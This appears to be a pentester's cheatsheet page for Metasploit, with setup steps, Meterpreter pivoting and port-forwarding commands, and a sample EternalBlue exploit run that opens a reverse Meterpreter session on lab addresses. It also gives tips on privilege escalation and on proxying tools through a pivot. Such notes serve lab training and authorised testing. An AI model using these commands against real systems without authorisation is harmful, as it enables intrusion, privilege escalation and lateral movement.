---
tags:
  - tool
category: exploitation
---

# MetaSploit

## Description

A full exploitation framework - exploit modules, payload generation (msfvenom), and post-exploitation via the Meterpreter agent, including session management, pivoting, and routing.

## Installation

```bash
sudo apt install metasploit-framework
msfconsole   # launches the console
```

## Common Usage

*Running this from a session in the meterpreter will add a route from that machine to the subnet that is specified*
```msfconsole
run autoroute -s <subnet>
```

*Running this from a session in the meterpreter will create a port forward to the victim ip address and port to your attack machine on the given port*
```msfconsole
portfwd add -l <local port to bind to> -p <victim port> -r <victim ip>
```

*Gives the network interface information for the victim*
```msfconsole
ipconfig
```

*Search for a module by keyword*
```msfconsole
search <keyword>
```

*Select and configure a module*
```msfconsole
use <module path>
set RHOSTS <target>
set LHOST <attack box ip>
run
```

## Flags Reference

| Command | Description |
|---|---|
| `search <term>` | Search loaded modules |
| `use <module>` | Select a module |
| `show options` | List required options for the current module |
| `set <OPTION> <value>` | Configure an option |
| `run` / `exploit` | Execute the module |
| `sessions -i <id>` | Interact with a session |
| `background` | Background the current session without killing it |
| `autoroute -s <subnet>` | Pivot: route traffic through a session |
| `portfwd add -l <local> -p <remote> -r <host>` | Port forward through a session |

## Example Output

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.10
RHOSTS => 10.10.10.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.5:4444
[+] 10.10.10.10:445 - Host is likely VULNERABLE to MS17-010!
[*] Meterpreter session 1 opened
```

## Notes / Gotchas

- `autoroute` only affects traffic sent through other Metasploit modules/sessions - to route external tools (nmap, etc.) through a Metasploit pivot, add the `socks_proxy` module and point `proxychains` at it.
- Meterpreter's `getsystem` is worth trying immediately after landing on a Windows box with local admin - it automates several well-known token/named-pipe privesc tricks in one command.

## Related

- [Using the Metasploit Framework](../HTB/Cheatsheets/Using%20the%20Metasploit%20Framework.md)
- [NetCat](NetCat.md) - lighter-weight alternative when a full Meterpreter session isn't needed
